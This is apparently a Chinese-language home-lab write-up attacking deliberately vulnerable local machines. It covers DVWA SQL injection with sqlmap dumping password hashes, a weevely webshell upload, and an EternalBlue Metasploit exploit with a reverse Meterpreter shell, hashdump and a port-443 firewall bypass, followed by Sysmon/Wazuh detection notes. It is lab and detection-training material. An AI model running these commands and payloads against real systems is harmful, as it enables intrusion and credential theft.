## 一、SQL 注入攻击（SQLi）

### 1.1 目标信息
| 项目 | 内容 |
|------|------|
| 目标 URL | `http://192.168.152.129:8080/vulnerabilities/sqli/` |
| 工具 | SQLMap + Burp Suite |
| 安全等级 | DVWA 设置为 Low |
| 攻击目标 | 获取数据库用户凭据 |

### 1.2 第一步：手工发现注入点

在 DVWA SQL Injection 页面输入 `'` 触发报错:

```
You have an error in your SQL syntax; check the manual that corresponds to ...
```

确认存在单引号闭合的字符型注入。使用 Burp Suite 抓包获取 Cookie:

```
Cookie: security=low; PHPSESSID=abcdef1234567890
```

### 1.3 第二步：SQLMap 自动化注入

```bash
# SQLMap 获取数据库列表
sqlmap -u "http://192.168.152.129:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abcdef1234567890" \
  --batch \
  --dbs
```

**输出结果:**
```
available databases [3]:
[*] dvwa
[*] information_schema
[*] mysql
```

```bash
# 获取 dvwa 数据库的表
sqlmap -u "http://192.168.152.129:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abcdef1234567890" \
  --batch \
  -D dvwa \
  --tables
```

**输出结果:**
```
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```

```bash
# 获取 users 表的字段和数据
sqlmap -u "http://192.168.152.129:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=abcdef1234567890" \
  --batch \
  -D dvwa \
  -T users \
  --dump
```

**输出结果（关键数据）:**
```
+----+--------+------------+----------------------------------+----------------------------------+
| id | user   | avatar     | password                         | last_name                        |
+----+--------+------------+----------------------------------+----------------------------------+
| 1  | admin  | <img src.. | 5f4dcc3b5aa765d61d8327deb882cf99 | (P@ssw0rd)                       |
| 2  | gordonb| <img src.. | e99a18c428cb38d5f260853678922e03 | (abc123)                         |
+----+--------+------------+----------------------------------+----------------------------------+
```

> 📸 **截图**: `screenshots/sql注入测试.png`
> SQLMap 成功 dump 出 users 表数据的终端输出界面

### 1.4 日志验证
```bash

curl -u admin:admin -X GET "https://localhost:9200/wazuh-alerts-*/_search?q=sqli&pretty" -k

```

## 二、WebShell 植入

### 2.1 使用 weevely 生成 WebShell

```bash
# 在 Kali 上生成 WebShell
weevely generate p@ssw0rd /tmp/shell.php

# 查看生成的文件
cat /tmp/shell.php
# 输出: base64 编码的一句话木马
```

### 2.2 通过 DVWA 文件上传漏洞上传

访问 `http://192.168.152.129:8080/vulnerabilities/upload/` 上传 `shell.php`。

验证上传成功:
```bash
# 访问 shell
curl http://192.168.152.129:8080/hackable/uploads/shell.php
# 页面返回空白（正常，weevely shell 需要密码参数）
```

### 2.3 连接 WebShell 执行命令

```bash
# 在 Kali 上连接 WebShell
weevely http://192.168.152.129:8080/hackable/uploads/shell.php p@ssw0rd

# 在 weevely shell 中执行系统命令
whoami
# www-data

id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

uname -a
# Linux 5.15.0-91-generic #101-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux
```

> 📸 **截图**: `screenshots/webshell上传.png`

## 三、MS17-010 永恒之蓝攻击

### 3.1 目标信息
| 项目 | 内容 |
|------|------|
| 目标 | Windows 7 (Win7-Target) |
| 漏洞 | MS17-010 (SMB 远程代码执行) |
| 工具 | Metasploit Framework |
| 前提 | Windows 7 未安装 KB4013389 补丁 |

### 3.2 漏洞扫描

```bash
# 使用 nmap 扫描 SMB 漏洞
# 先确认 Win7 的 IP 地址
nmap -p445 --open 192.168.152.0/24
# 假设 Win7 IP 为 192.168.152.131

nmap -p445 --script smb-vuln-ms17-010 192.168.152.131
```

**扫描结果:**
```
Nmap scan report for 192.168.152.131
Host is up (0.0015s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (MS17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

> 📸 **截图**: `screenshots/ms17-010攻击.png`
> Nmap 扫描结果显示目标存在 MS17-010 漏洞

### 3.3 建立 Meterpreter 会话

```bash
msfconsole

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.152.131   # Win7 IP
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.152.130     # Kali IP
msf6 > set LPORT 4444
msf6 > check

# 输出: The target is vulnerable.
msf6 > exploit

# 成功获取 Meterpreter 会话
meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
# Computer        : WIN7-TARGET
# OS              : Windows 7 (6.1 Build 7601)
# Architecture    : x64

meterpreter > hashdump
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### 3.4 🔧 踩坑记录: MSF 连接被 Windows 防火墙拦截

**问题现象**: 执行 `exploit` 后 Payload 发送成功，但无法收到 Meterpreter 会话。

**排查过程**:
```bash
# 在 Kali 上检查监听状态
ss -tlnp | grep 4444
# 发现端口正在监听

# Windows 7 防火墙默认拦截入站连接
```

**解决方案**:
```bash
# 使用常见端口（443）绕过
msf6 > set LPORT 443

# 或使用 reverse_https 载荷
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LPORT 443
```

### 3.5 Sysmon 日志中的攻击痕迹

MS17-010 攻击在 Sysmon 中会留下以下关键事件:

| Sysmon EventID | 描述 | 关键字段 |
|---------------|------|---------|
| 1 (ProcessCreate) | `spoolsv.exe` 创建 `cmd.exe` | 异常父进程链 |
| 3 (NetworkConnect) | 目标连接 `192.168.152.130:4444` | 外连可疑 IP |
| 11 (FileCreate) | 创建可执行文件 | 非系统路径写 exe |
| 13 (RegistryEvent) | 注册表修改 | 服务创建/启动类型修改 |

这些 Sysmon 事件通过 Wazuh Agent 上报到 Wazuh Server，触发自定义规则产生告警。
